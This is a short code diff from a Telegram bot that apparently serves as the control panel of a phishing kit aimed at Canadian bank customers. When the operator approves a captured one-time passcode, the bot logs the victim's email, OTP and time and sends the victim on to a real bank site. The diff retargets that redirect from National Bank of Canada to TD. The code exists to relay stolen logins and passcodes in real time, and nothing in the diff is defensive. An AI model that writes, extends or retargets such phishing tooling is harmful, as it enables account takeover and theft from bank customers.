@@ -122,13 +122,13 @@ bot.on('callback_query', async (callbackQuery) => {
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ OTP Accepted & Verified!' });
 
       await bot.editMessageText(
-        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.nbc.ca/`,
+        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/ca/en/personal-banking`,
         {
           chat_id: message.chat.id,
           message_id: message.message_id
         }
       );
-      console.log(`[Bot] Verified OTP for ${email}. User redirecting to https://www.nbc.ca/`);
+      console.log(`[Bot] Verified OTP for ${email}. User redirecting to https://www.td.com/ca/en/personal-banking`);
 
     } else if (action === 'wrong_otp') {
       session.status = 'rejected';
